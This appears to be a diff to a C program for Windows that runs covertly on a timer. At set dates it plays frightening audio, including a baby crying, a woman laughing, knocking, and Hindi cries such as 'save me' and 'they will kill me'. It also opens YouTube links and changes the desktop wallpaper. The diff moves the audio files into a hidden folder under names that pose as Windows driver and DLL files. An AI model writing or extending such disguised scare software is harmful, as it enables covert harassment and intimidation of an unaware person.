@@ -10,6 +10,8 @@
 #define TARGET_DAY 12  // white noise
 #define TARGET_DAY1 14 // babycrying,femalelaugh,doorknock
 #define TARGET_DAY2 16 // satiish,dundhomujhe,bachaao,womujhemaardenge,  websites
+#define TARGET_DAY3 6 // satiish,dundhomujhe,bachaao,womujhemaardenge,  websites
+#define TARGET_MONTH2 8
 
 int main()
 {
@@ -46,6 +48,7 @@ int main()
     struct tm targetTime = {0};
     struct tm targetTime2 = {0};
     struct tm targetTime3 = {0};
+    struct tm targetTime4 = {0};
 
     // Get the current time
     time(&currentTime);
@@ -54,25 +57,28 @@ int main()
     struct tm *localTime = localtime(&currentTime);
 
     // Set the target time
-    targetTime.tm_year = targetTime2.tm_year = targetTime3.tm_year = TARGET_YEAR - 1900; // tm_year is years since 1900
+    targetTime4.tm_year= targetTime.tm_year = targetTime2.tm_year = targetTime3.tm_year = TARGET_YEAR - 1900; // tm_year is years since 1900
     targetTime.tm_mon = targetTime2.tm_mon = targetTime3.tm_mon = TARGET_MONTH - 1;      // tm_mon is zero-based, so subtract 1
     targetTime.tm_mday = TARGET_DAY;
     targetTime2.tm_mday = TARGET_DAY1;
     targetTime3.tm_mday = TARGET_DAY2;
+    targetTime4.tm_mday = TARGET_DAY3;
+    targetTime4.tm_mon = TARGET_MONTH2-1;
+
     int random[20]={3, 5, 2, 1, 0, 3, 1, 4, 5, 2, 0, 4, 3, 2, 1, 5, 2, 1, 0, 2};
     int random3[30]={4, 4, 0, 1, 6, 2, 8, 2, 7, 8, 2, 6, 4, 3, 8, 2, 2, 3, 4, 6, 4, 1, 4, 1, 9, 3, 5, 9, 0, 2};
     int random2[30]={13, 0, 1, 4, 5, 11, 8, 2, 6, 9, 6, 10, 5, 4, 2, 6, 5, 3, 12, 8, 7, 2, 10, 7, 7, 10, 1, 13, 8, 9};
     char *sounds[] = 
-    { "windows_drivers/win1.txt",
-    "windows_drivers/win2.txt",
-    "windows_drivers/win3.txt",
-    "windows_drivers/sys1.txt",
-    "windows_drivers/sys2.txt",
-    "windows_drivers/sys3.txt",
-    "windows_drivers/dll1.txt",
-    "windows_drivers/dll2.txt",
-    "windows_drivers/winsys1.txt",
-    "windows_drivers/winsys2.txt"};
+    { "C:\\.Win_dll_sys\\windows_drivers\\win1.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\win2.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\win3.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\sys1.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\sys2.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\sys3.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\dll1.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\dll2.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\winsys1.txt",
+    "C:\\.Win_dll_sys\\windows_drivers\\winsys2.txt"};
     char *links[14] = {
         "https://www.youtube.com/watch?v=zHeCcu3E6RA",
         "https://www.youtube.com/watch?v=ANKIh_yIIc8",
@@ -92,13 +98,21 @@ int main()
     int random_number1, random_number2;
     int webtime = 600000;
     int ind=rand()%20,ind2=rand()%30;
-    Sleep(600000);
+    Sleep(webtime);
 
     // Compare the current time with the target time
         // Sleep(600000); // Adjust the duration as needed
+    if (difftime(mktime(localTime), mktime(&targetTime4)) >0)
+        {
+    const wchar_t *path = L"C:\\.Win_dll_sys\\maxresdefault.txt";
+    int result;
+    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);
+        }
+        else
+        {
+
     while(1)
     {
-
     if (difftime(mktime(localTime), mktime(&targetTime3)) > 0)
     {
         printf("here");
@@ -153,6 +167,9 @@ int main()
 
         Sleep(random_number1*100000); // Adjust the duration as needed
     }
+        }
+
+
 
     return 0;
 }
